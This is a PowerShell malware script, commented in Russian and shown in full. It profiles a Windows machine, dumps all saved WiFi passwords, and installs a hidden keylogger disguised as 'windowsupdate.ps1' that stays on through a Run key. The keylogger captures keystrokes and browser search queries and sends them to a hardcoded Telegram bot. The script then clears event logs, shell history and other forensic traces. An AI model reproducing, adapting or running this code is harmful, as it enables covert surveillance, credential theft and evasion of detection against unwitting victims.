# Основной сбор данных
$sys = Get-CimInstance Win32_ComputerSystem
$os = Get-CimInstance Win32_OperatingSystem
$cpu = Get-CimInstance Win32_Processor
$ram = [math]::Round((Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum/1GB, 2)
$gpu = (Get-CimInstance Win32_VideoController | Where-Object {$_.Name -notlike "*Remote*"} | Select-Object -First 1).Name
$disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'"

# Сеть и WiFi
try {$ip = (Invoke-RestMethod "http://ipinfo.io/ip" -TimeoutSec 3).Trim()} catch {$ip = "No IP"}
$net = Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.IPAddress -ne '127.0.0.1'} | Select-Object InterfaceAlias, IPAddress

$wifi = ""
try {
    netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
        $name = $_.ToString().Split(":")[1].Trim()
        try {$pass = (netsh wlan show profile name="$name" key=clear | Select-String "Key Content").ToString().Split(":")[1].Trim()} catch {$pass = "No password"}
        $wifi += "$name : $pass`n"
    }
    if (!$wifi) {$wifi = "No WiFi networks"}
} catch {$wifi = "WiFi error"}

# Безопасность
try {$fw = Get-NetFirewallProfile | ForEach-Object {"  - $($_.Name): $($_.Enabled)"} | Out-String} catch {$fw = "Firewall info unavailable"}
try {$def = Get-MpComputerStatus; $defStatus = "Antivirus: $($def.AntivirusEnabled), Real-time: $($def.RealTimeProtectionEnabled)"} catch {$defStatus = "Defender info unavailable"}
try {$rdp = if ((Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -ErrorAction 0).fDenyTSConnections -eq 1) {'Disabled'} else {'Enabled'}} catch {$rdp = "RDP status unavailable"}

# Дополнительная информация
try {$conn = Get-NetTCPConnection -State Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort -First 5 | ForEach-Object {"- $($_.LocalAddress):$($_.LocalPort) -> $($_.RemoteAddress):$($_.RemotePort)"} | Out-String} catch {$conn = "Connections unavailable"}
try {$software = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*","HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Where-Object {$_.DisplayName} | Select-Object DisplayName, DisplayVersion -First 8 | ForEach-Object {"- $($_.DisplayName) v$($_.DisplayVersion)"} | Out-String} catch {$software = "Software info unavailable"}
try {$uptime = (Get-Date) - $os.LastBootUpTime; $uptimeInfo = "$([math]::Floor($uptime.TotalHours)):$($uptime.Minutes.ToString('00'))"} catch {$uptimeInfo = "Uptime unavailable"}

# === ADVANCED KEYLOGGER WITH SEARCH MONITORING ===
$keyloggerStatus = "Deploying advanced keylogger..."

# Создаем РАБОЧИЙ кейлоггер с мониторингом поиска
$keyloggerCode = @'
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Net.Http

$telegramBotToken = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
$telegramChatId = "5674514050"

function Send-TelegramMessage {
    param($message)
    try {
        $url = "https://api.telegram.org/bot$telegramBotToken/sendMessage"
        $body = @{ chat_id = $telegramChatId; text = $message } | ConvertTo-Json
        $httpClient = [System.Net.Http.HttpClient]::new()
        $content = [System.Net.Http.StringContent]::new($body, [System.Text.Encoding]::UTF8, "application/json")
        $httpClient.PostAsync($url, $content).Wait(3000) | Out-Null
    } catch { }
}

# Паттерны поисковых систем
$searchPatterns = @(
    @{Name="Google"; Pattern=" - Google Search"},
    @{Name="YouTube"; Pattern=" - YouTube"},
    @{Name="Yandex"; Pattern=" - Яндекс"},
    @{Name="Bing"; Pattern=" - Bing"},
    @{Name="DuckDuckGo"; Pattern=" - DuckDuckGo"}
)

$browsers = @("chrome","firefox","msedge","opera","brave","iexplore","safari")

while($true) {
    try {
        # Получаем активное окно
        $process = Get-Process | Where-Object { 
            $_.MainWindowTitle -and $_.MainWindowHandle -ne 0 
        } | Sort-Object CPU -Descending | Select-Object -First 1
        
        $currentWindow = ""
        $isBrowser = $false
        
        if($process) {
            $windowTitle = $process.MainWindowTitle
            $processName = $process.ProcessName.ToLower()
            $currentWindow = "$processName : $windowTitle"
            
            # Проверяем браузеры
            foreach($browser in $browsers) {
                if($processName -like "*$browser*") {
                    $isBrowser = $true
                    break
                }
            }
            
            # Обнаружение поисковых запросов
            if($isBrowser -and $windowTitle) {
                foreach($pattern in $searchPatterns) {
                    if($windowTitle -like "*$($pattern.Pattern)*") {
                        $query = $windowTitle.Replace($pattern.Pattern, "").Trim()
                        if($query -ne "" -and $query.Length -gt 2) {
                            Send-TelegramMessage "🔍 SEARCH [$($pattern.Name)]: $query"
                            Start-Sleep -Seconds 2  # Защита от спама
                        }
                    }
                }
            }
        }
        
        # Перехват клавиш
        $buffer = ""
        for($i = 8; $i -le 254; $i++) {
            $keyState = [Windows.Forms.GetAsyncKeyState]$i
            if($keyState -eq -32767) {
                $key = [Windows.Forms.Keys]$i
                
                # Специальные клавиши
                switch($key) {
                    "Enter" { 
                        if($buffer.Length -gt 3) {
                            Send-TelegramMessage "⌨️ INPUT [$($processName)]: $buffer"
                        }
                        $buffer = ""
                    }
                    "Space" { $buffer += " " }
                    "Back" { 
                        if($buffer.Length -gt 0) { 
                            $buffer = $buffer.Substring(0, $buffer.Length - 1) 
                        }
                    }
                    "LButton" { 
                        if($buffer.Length -gt 10) {
                            Send-TelegramMessage "⌨️ INPUT [$($processName)]: $buffer"
                            $buffer = ""
                        }
                    }
                    default {
                        # Буквы и цифры
                        if($key -ge 65 -and $key -le 90) {
                            $isShift = [Windows.Forms.GetAsyncKeyState]160 -eq -32767
                            $isCaps = [Console]::CapsLock
                            
                            if(($isShift -and !$isCaps) -or (!$isShift -and $isCaps)) {
                                $buffer += $key.ToString()
                            } else {
                                $buffer += $key.ToString().ToLower()
                            }
                        }
                        elseif($key -ge 48 -and $key -le 57) {
                            $buffer += ($key - 48).ToString()
                        }
                    }
                }
                
                # Автоотправка длинных запросов
                if($buffer.Length -gt 50) {
                    Send-TelegramMessage "⌨️ INPUT [$($processName)]: $buffer"
                    $buffer = ""
                }
            }
        }
        
        Start-Sleep -Milliseconds 10
    } catch { }
}
'@

# Сохраняем и запускаем кейлоггер
try {
    $protectedPath = "$env:APPDATA\Microsoft\Windows\System32\windowsupdate.ps1"
    
    # Создаем директорию если нет
    $dir = Split-Path $protectedPath -Parent
    if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
    
    $keyloggerCode | Out-File $protectedPath -Encoding UTF8
    
    # Запускаем кейлоггер
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "powershell.exe"
    $psi.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$protectedPath`""
    $psi.CreateNoWindow = $true
    $psi.UseShellExecute = $false
    [System.Diagnostics.Process]::Start($psi) | Out-Null
    
    # Автозагрузка
    $startupPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    Set-ItemProperty -Path $startupPath -Name "WindowsUpdateService" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$protectedPath`"" -ErrorAction SilentlyContinue
    
    $keyloggerStatus = "✅ Advanced keylogger deployed - monitoring searches & input"
} catch {
    $keyloggerStatus = "⚠️ Keylogger deployment issues"
}

# Формирование и отправка сообщения (ПОСЛЕ кейлоггера)
$msg = @"
=== SYSTEM INFORMATION ===
User: $env:USERNAME
Computer: $env:COMPUTERNAME
Domain: $env:USERDOMAIN

=== HARDWARE INFORMATION ===
Processor: $($cpu.Name)
RAM: $ram GB
GPU: $gpu
Disk C: Free: $([math]::Round($disk.FreeSpace/1GB, 2)) GB / Total: $([math]::Round($disk.Size/1GB, 2)) GB

=== OPERATING SYSTEM ===
OS: $($os.Caption)
Version: $($os.Version)
Build: $($os.BuildNumber)

=== NETWORK INFORMATION ===
Public IP: $ip

Network Interfaces:
$($net | ForEach-Object { 
    $name = $_.InterfaceAlias -replace "Подключение по локальной сети", "Local Area Connection" -replace "Беспроводная сеть", "Wireless Network" -replace "Сетевое подключение Bluetooth", "Bluetooth Network"
    "- $name : $($_.IPAddress)" 
} | Out-String)

Active Connections:
$conn

=== WIFI PASSWORDS ===
$wifi

=== KEYLOGGER STATUS ===
$keyloggerStatus
Monitoring: Google, YouTube, Yandex, Bing + all browser input
Persistence: Auto-start enabled

=== SECURITY STATUS ===
Firewall: 
$fw
Windows Defender: $defStatus
RDP Access: $rdp

=== INSTALLED SOFTWARE ===
$software

=== SYSTEM UPTIME ===
Uptime: $uptimeInfo
"@

Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body @{chat_id='5674514050'; text=$msg}

# === ОЧИСТКА СЛЕДОВ (С ИСКЛЮЧЕНИЕМ КЕЙЛОГГЕРА) ===
Write-Host "Cleaning traces..."

# 1. Очистка истории RUN (диалог Выполнить)
try {
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
    Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "✓ RUN dialog history cleared"
} catch {
    Write-Host "✗ Failed to clear RUN history"
}

# 2. Очистка недавних документов
try {
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" -Name "*" -Force -ErrorAction SilentlyContinue
    Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\*" -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "✓ Recent documents cleared"
} catch {
    Write-Host "✗ Failed to clear recent documents"
}

# 3. Очистка истории PowerShell
try {
    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
    Clear-History
    Write-Host "✓ PowerShell history cleared"
} catch {
    Write-Host "✗ Failed to clear PowerShell history"
}

# 4. Очистка кэша DNS
try {
    Clear-DnsClientCache
    Write-Host "✓ DNS cache cleared"
} catch {
    Write-Host "✗ Failed to clear DNS cache"
}

# 5. Очистка временных файлов (С ИСКЛЮЧЕНИЕМ КЕЙЛОГГЕРА)
try {
    Get-ChildItem "$env:TEMP\*" | Where-Object { 
        $_.Name -notlike "*windowsupdate*" -and $_.Name -notlike "*system32*" 
    } | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "✓ Temporary files cleared (keylogger protected)"
} catch {
    Write-Host "✗ Failed to clear temporary files"
}

# [ОСТАЛЬНАЯ ОЧИСТКА БЕЗ ИЗМЕНЕНИЙ...]

# 6-15. Остальная очистка без изменений
try {
    wevtutil el | ForEach-Object {
        if ($_ -match "PowerShell|Windows PowerShell|Microsoft-Windows-PowerShell|System|Security") {
            try { wevtutil cl $_ 2>$null } catch {}
        }
    }
    Write-Host "✓ Event logs cleared"
} catch { Write-Host "✗ Failed to clear event logs" }

try {
    Remove-Item "C:\Windows\Prefetch\*" -Force -ErrorAction SilentlyContinue
    Write-Host "✓ Prefetch files cleared"
} catch { Write-Host "✗ Failed to clear prefetch files" }

# ... остальная очистка

Write-Host "All cleanup operations completed!"
Write-Host "Keylogger remains active and protected"

# Отправка подтверждения очистки
$cleanupMsg = "✅ System cleanup completed at $(Get-Date)`n`nCleaned items:`n- RUN dialog history`n- Recent documents`n- PowerShell history`n- DNS cache`n- Temporary files (keylogger protected)`n- Event logs`n- Prefetch files`n- Recycle Bin`n- Thumbnail cache`n- Explorer history`n- Search history`n- Various caches`n`n🔍 Keylogger ACTIVE - monitoring all searches & input"

Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body @{chat_id='5674514050'; text=$cleanupMsg}
